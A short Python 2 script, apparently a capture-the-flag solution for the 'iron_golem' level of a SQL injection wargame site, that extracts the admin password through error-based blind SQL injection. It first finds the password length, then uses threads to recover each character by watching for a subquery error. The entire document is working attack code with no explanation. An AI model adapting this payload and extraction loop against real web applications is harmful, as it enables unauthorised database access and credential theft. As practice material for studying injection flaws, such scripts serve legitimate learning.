import requests as req
import sys
import string
import threading
s = req.session()
chrs = string.printable
cookies = {"PHPSESSID":""}
url = 'https://los.eagle-jump.org/iron_golem.php'
#lens
len = 0
for i in xrange(100):
	print '[+] test len = %d' %i
	pay = "' or (id='admin' and if(length(pw) = %d,1,(select 1 union select 2 union select 3)))#"%i
	r = s.get(url,params={'pw':pay},cookies=cookies)
	if 'Subquery' not in r.text:
		print '[found] len = '+str(i)
		len = i
		break
pw = [0]*len
lock = threading.Lock()
def find(pos):
	global pw,lock
	for j in chrs:
		pay = "' or (id='admin' and if(ord(substr(pw,%d,1)) = %d,1,(select 1 union select 2 union select 3)))#"%(pos+1,ord(j))
		#print pay
		r = req.get(url,params={'pw':pay},cookies=cookies)
		if 'Subquery' not in r.text:
			lock.acquire()
			pw[pos] = ord(j)
			lock.release()
			print "[+] find %s at pos %d"%(j,pos)
			return
	print "[+] pos %d not found" % pos
pool = []
for i in xrange(len):
	t = threading.Thread(target=find,args=(i,),name='thread#'+str(i))
	pool.append(t)
	t.start()

for i in pool:
	i.join()
for i in pw:
	sys.stdout.write(chr(i))
